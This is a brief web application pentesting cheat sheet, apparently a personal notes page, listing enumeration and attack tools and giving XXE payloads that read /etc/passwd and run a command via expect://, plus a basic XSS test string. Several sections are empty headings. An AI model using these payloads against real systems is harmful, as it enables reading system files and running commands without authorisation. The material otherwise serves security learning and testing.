---
layout: page
title: Web App
permalink: /web/
---

# Index

* [Enumeration](#enumeration)
* [Authentication](#authentication)
* [Session Management](#session-management)
* [XML External Entity](#xml-external-entity)
* [SQL Injection](#sql-injection)
* [Cross Site Scripting](#cross-site-scripting)
* [Deserialization](#deserialization)

## Enumeration

Enumerating a web application is best performed manually with automated augmentations.

### Spidering

`burpsuite`

### Directory Brute Forcing

`dirbuster`

### Web Server Scanning

`nikto`

---

## Authentication

### Brute Forcing Online

`hydra`

---

## Session Management

---

## XML External Entity

Local file inclusion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Remote code exectuion

```XML
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```
Above is just proof of concept, other functions exist.

---

## SQL Injection

`sqlmap`

---

## Cross Site Scripting

Wherever user input is reflect in the site test for XSS with:

``` Javascript
    <script>alert('x')</script>
```

---

## Deserialization

